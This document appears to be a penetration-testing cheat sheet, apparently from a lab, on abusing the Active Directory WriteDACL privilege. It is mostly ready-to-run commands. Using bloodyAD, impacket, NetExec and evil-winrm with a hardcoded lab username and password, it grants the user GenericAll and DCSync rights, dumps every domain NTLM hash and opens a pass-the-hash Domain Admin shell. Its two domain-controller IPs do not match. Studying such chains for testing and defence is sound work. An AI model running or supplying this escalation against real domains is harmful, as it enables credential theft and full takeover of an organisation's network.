**WriteDACL** is a privilege that allows modification of the Discretionary ACL (DACL) of an AD object. If a user can write to the DACL of an object, they can grant themselves additional rights over that object.

- Common rights abused:
    - `GenericAll` → full control over the object.
    - `FullControl` → same as above, including password reset.
    - `DCSync` → ability to replicate directory data (dump hashes).

---

## Exploitation Process

#### Step 1: Enumerate Permissions

- Use tools like `ldapsearch`, `ldapdomaindump`, `Blodhound` or `dacledit` to identify objects where the user has WriteDACL.

```bash
impacket-dacledit -action 'read' \
-target-dn 'CN=Users,DC=bbr,DC=thl' \
'bbr.thl'/'song':'Passwordsave@' -dc-ip 192.168.1.40
```

#### Step 2: Abuse WriteDACL 

- Grant self `GenericAll` on the domain.

```bash
bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' \
--dc-ip 192.168.212.4 add genericAll 'DC=BBR,DC=THL' song
```

- Result: `song` has full control over the domain object.

#### Step 3: Assign DCSync Rights

- Add replication rights to `song`.

```bash
bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' \
--dc-ip 192.168.212.4 add dcsync song
```

- Rights added:
    - `Replicating Directory Changes`
    - `Replicating Directory Changes All`
    - `Replicating Directory Changes In Filtered Set`

#### Step 4: Perform DCSync Attack

- Use Netexec to dump password hashes.

```bash
nxc smb 192.168.1.40 -u 'song' -p 'Passwordsave@' --ntds 
```

- Output: NTLM hashes of all domain accounts, including `Administrator`.

#### Step 5: Use Extracted Credentials

- Authenticate as Administrator using Pass-the-Hash or cracked password.

```bash
evil-winrm -i 192.168.212.4 -u Administrator -H <NTLM_HASH>
```

- Gain full interactive shell as Domain Admin.


